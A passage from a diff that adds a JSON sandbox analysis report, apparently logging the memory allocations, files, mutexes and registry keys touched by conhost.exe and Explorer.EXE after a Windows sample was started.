+                "process_name": "conhost.exe",
+                "ppid": null,
+                "kpid": "0xfffffa8002d56080",
+                "new": true,
+                "monitored": true,
+                "time": "Thu, 01 Oct 2020 22:16:19 UTC",
+                "files_checked": [
+                    "\\Windows\\system32\\ega.cpi"
+                ],
+                "memory": [
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002d56080",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x290000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0xf0000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x100000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x40000",
+                                "base_address": "0x19c0000"
+                            },
+                            {
+                                "size": "0x1a0000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x40000",
+                                "base_address": "0x1ec0000"
+                            },
+                            {
+                                "size": "0xffff0",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002d56080",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x2c0000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2c2000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2c3000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x2c4000"
+                            },
+                            {
+                                "size": "0xd000",
+                                "base_address": "0x2c8000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2d5000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2d6000"
+                            },
+                            {
+                                "size": "0x24a",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2d7000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2d8000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x1a30000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x1a32000"
+                            },
+                            {
+                                "size": "0xe000",
+                                "base_address": "0x1a40000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2d9000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2da000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2db000"
+                            },
+                            {
+                                "size": "0xb000",
+                                "base_address": "0x19f5000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2dc000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x2dd000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x1f30000"
+                            },
+                            {
+                                "size": "0x5000",
+                                "base_address": "0x1f32000"
+                            },
+                            {
+                                "size": "0x5000",
+                                "base_address": "0x1f37000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2df000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2e0000"
+                            },
+                            {
+                                "size": "0x3000",
+                                "base_address": "0x2e1000"
+                            },
+                            {
+                                "size": "0xc000",
+                                "base_address": "0x2e4000"
+                            },
+                            {
+                                "size": "0xb000",
+                                "base_address": "0x1ef5000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2f0000"
+                            },
+                            {
+                                "size": "0x6000",
+                                "base_address": "0x2f1000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2f7000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2f8000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2f9000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2fa000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x1a36000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2fb000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x1a37000"
+                            },
+                            {
+                                "size": "0x7000",
+                                "base_address": "0x1a39000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x1960000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2fc000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x2fd000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2270000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x2ff000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002d56080",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT",
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002d56080",
+                        "protect": [
+                            "PAGE_GUARD",
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x1ef5000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x1ef4000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x1ef3000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002d56080",
+                        "protect": [
+                            "PAGE_NOACCESS"
+                        ],
+                        "allocation_type": [
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x10000",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    }
+                ],
+                "mutants_opened": [
+                    "Local\\MSCTF.Asm.MutexDefault1"
+                ],
+                "parent": "0xfffffa80018b3120",
+                "proc": false,
+                "startup_info": {
+                    "shell_info": "",
+                    "current_directory": "C:\\Windows\\system32\\",
+                    "command_line": "\\??\\C:\\Windows\\system32\\conhost.exe \"299455020-416381460-1156656572828596407140930047020737899361426836833-898846250\"",
+                    "upid": 1616,
+                    "uthread": 0,
+                    "image_pathname": "C:\\Windows\\system32\\conhost.exe",
+                    "dll_path": "C:\\Windows\\system32;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+                    "runtime_data": "",
+                    "tid": "0xfffffa8002e60b50",
+                    "desktop_info": "Winsta0\\Default",
+                    "incomplete": false
+                },
+                "threads": [
+                    {
+                        "client_id": 7820861462072297000,
+                        "create_suspended": "0x1",
+                        "process": "0x00000000",
+                        "process_handle": "0xffffffff",
+                        "return": 0,
+                        "thread": "0x00000000"
+                    },
+                    {
+                        "client_id": 16566580206027469000,
+                        "create_suspended": "0x1",
+                        "process": "0x00000000",
+                        "process_handle": "0xffffffff",
+                        "return": 0,
+                        "thread": "0x00000000"
+                    }
+                ],
+                "analyzed_because": "Process activity after target sample started."
+            },
+            "15": {
+                "pid": 1028,
+                "process_name": "Explorer.EXE",
+                "ppid": null,
+                "kpid": "0xfffffa8002c86b30",
+                "new": false,
+                "monitored": true,
+                "time": "Thu, 01 Oct 2020 22:16:19 UTC",
+                "files_checked": [
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\desktop.ini",
+                    "\\Users\\Administrator\\Desktop\\%1",
+                    "\\Users\\Public\\Desktop\\%1",
+                    "\\Windows\\system32\\notepad.exe.Config"
+                ],
+                "files_modified": [
+                    "\\samr"
+                ],
+                "files_read": [
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\Documents.library-ms",
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\Music.library-ms",
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\Pictures.library-ms",
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\Videos.library-ms",
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\desktop.ini",
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\desktop.ini",
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Notepad.lnk",
+                    "\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\slideshow.ini",
+                    "\\Users\\Administrator\\Documents\\desktop.ini",
+                    "\\Users\\Administrator\\Downloads\\desktop.ini",
+                    "\\Users\\Administrator\\Links\\Desktop.lnk",
+                    "\\Users\\Administrator\\Links\\Downloads.lnk",
+                    "\\Users\\Administrator\\Links\\RecentPlaces.lnk",
+                    "\\Users\\Administrator\\Links\\desktop.ini",
+                    "\\Users\\Administrator\\Music\\desktop.ini",
+                    "\\Users\\Administrator\\Pictures\\desktop.ini",
+                    "\\Users\\Administrator\\Videos\\desktop.ini",
+                    "\\Users\\Public\\Documents\\desktop.ini",
+                    "\\Users\\Public\\Music\\desktop.ini",
+                    "\\Users\\Public\\Pictures\\desktop.ini",
+                    "\\Users\\Public\\Videos\\desktop.ini",
+                    "\\Windows\\System32\\ieframe.dll",
+                    "\\Windows\\System32\\stdole2.tlb",
+                    "\\Windows\\winsxs\\FileMaps\\$$.cdf-ms",
+                    "\\Windows\\winsxs\\FileMaps\\$$_system32_21f9a9c4a2f8b514.cdf-ms",
+                    "\\samr"
+                ],
+                "memory": [
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002c86b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x8080000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0xf0000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x7c20000"
+                            },
+                            {
+                                "size": "0x100000",
+                                "base_address": "0x80000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x7c60000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x200000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x4440000"
+                            },
+                            {
+                                "size": "0x100248",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x9ac0000"
+                            },
+                            {
+                                "size": "0x1001fc",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x100180",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x67d0000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x5d30000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x9e50000"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0xa030000"
+                            },
+                            {
+                                "size": "0x800000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x5d50000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002c86b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x80ef000"
+                            },
+                            {
+                                "size": "0x9000",
+                                "base_address": "0x2971000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x1fe2000"
+                            },
+                            {
+                                "size": "0xd000",
+                                "base_address": "0x1fe6000"
+                            },
+                            {
+                                "size": "0x14000",
+                                "base_address": "0x15c000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x7c8f000"
+                            },
+                            {
+                                "size": "0xff000",
+                                "base_address": "0x81000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x7ccf000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x26f000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x44af000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74be000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x74c0000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x74c4000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x74c8000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x74c9000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74d1000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74d3000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x74d5000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74d6000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x74d8000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x74d9000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74da000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x74dc000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x74dd000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74e1000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x74e3000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x74e4000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x74ec000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74ed000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x74ef000"
+                            },
+                            {
+                                "size": "0x14000",
+                                "base_address": "0x74f1000"
+                            },
+                            {
+                                "size": "0x20000",
+                                "base_address": "0x7505000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x7525000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x7536000"
+                            },
+                            {
+                                "size": "0x23000",
+                                "base_address": "0x753a000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x755d000"
+                            },
+                            {
+                                "size": "0x23000",
+                                "base_address": "0x7565000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x7588000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7590000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x7592000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7593000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x7595000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x7599000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x759d000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x759f000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x75a1000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x75a9000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x75ad000"
+                            },
+                            {
+                                "size": "0x7000",
+                                "base_address": "0x75b1000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x75b8000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x75b9000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x75ba000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x75bb000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x75bf000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x75c3000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x75c7000"
+                            },
+                            {
+                                "size": "0x5000",
+                                "base_address": "0x75cf000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x75d4000"
+                            },
+                            {
+                                "size": "0x10000",
+                                "base_address": "0x75dc000"
+                            },
+                            {
+                                "size": "0x3000",
+                                "base_address": "0x2a3000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x2a6000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x75ec000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x75f4000"
+                            },
+                            {
+                                "size": "0x41000",
+                                "base_address": "0x75f8000"
+                            },
+                            {
+                                "size": "0x43000",
+                                "base_address": "0x7639000"
+                            },
+                            {
+                                "size": "0x248",
+                                "base_address": "0x9a60000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x9b2f000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x767c000"
+                            },
+                            {
+                                "size": "0x1fc",
+                                "base_address": "0x9b40000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x7684000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x7688000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x768c000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x7690000"
+                            },
+                            {
+                                "size": "0x180",
+                                "base_address": "0x9b40000"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x7694000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x769c000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x76a0000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x76a4000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x683f000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x2a7000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x5d9f000"
+                            },
+                            {
+                                "size": "0x20000",
+                                "base_address": "0x76a8000"
+                            },
+                            {
+                                "size": "0x9000",
+                                "base_address": "0x76c8000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x9ebf000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x76d1000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x76d5000"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x76d7000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0xa09f000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x76d8000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x76da000"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x76de000"
+                            },
+                            {
+                                "size": "0x9000",
+                                "base_address": "0x76e2000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x76eb000"
+                            },
+                            {
+                                "size": "0x41000",
+                                "base_address": "0xa0b0000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0x5dbf000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002c86b30",
+                        "protect": [
+                            "PAGE_GUARD",
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x80ef000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x80ee000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x80ed000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x645f000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x645e000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7c8f000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7c8e000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7c8d000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7ccf000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7cce000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7ccd000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44af000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44ae000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44ad000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44ac000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x3bff000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x3bfe000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x3bfd000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44ab000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44aa000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44a9000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44a8000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44a7000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x9b2f000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x9b2e000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x9b2d000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44a6000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x44a5000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x645d000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x645c000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x645b000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x645a000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x3bfc000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x3bfb000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x3bfa000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x3bf9000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7adf000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7ade000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7add000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x5d9f000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x5d9e000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x5d9d000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x5d9c000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x7adc000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002c86b30",
+                        "protect": [
+                            "PAGE_READONLY"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x9462000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002c86b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT",
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x20000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x1d4c",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x2710",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x1000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x7980",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0xf300",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x14ac",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x2a00",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x160",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x144",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x200000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x400",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0xfd20",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x1fa40",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x8000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x12000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x48000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xcf8",
+                        "zero_bits": 0,
+                        "process": "0x00000000",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x58",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xccc",
+                        "zero_bits": 0,
+                        "process": "0x00000000",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x58",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002c86b30",
+                        "protect": [
+                            "PAGE_EXECUTE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x10000",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    }
+                ],
+                "mutants_created": [
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_1024.db!dfMaintainer",
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_256.db!dfMaintainer",
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_32.db!dfMaintainer",
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_96.db!dfMaintainer",
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_idx.db!ThumbnailCacheInit",
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_idx.db!rwReaderRefs",
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_idx.db!rwWriterMutex",
+                    "Global\\C::Users:Administrator:AppData:Local:Microsoft:Windows:Explorer:thumbcache_sr.db!dfMaintainer",
+                    "Local\\Shell.CMruPidlList"
+                ],
+                "mutants_opened": [
+                    "DefaultTabtip-MainUI"
+                ],
+                "parent": "",
+                "registry_keys_opened": [
+                    {
+                        "access": [
+                            "CREATE_SUB_KEY",
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL",
+                            "SET_VALUE"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\RUNMRU",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    },
+                    {
+                        "access": [
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\TYPEDURLS",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    },
+                    {
+                        "access": [
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\TYPEDPATHS",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    },
+                    {
+                        "access": [
+                            "CREATE_SUB_KEY",
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL",
+                            "SET_VALUE"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\INTERNET SETTINGS",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    },
+                    {
+                        "access": [
+                            "CREATE_SUB_KEY",
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL",
+                            "SET_VALUE"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500_CLASSES\\LOCAL SETTINGS\\SOFTWARE\\MICROSOFT\\WINDOWS\\SHELL\\BAGMRU",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    },
+                    {
+                        "access": [
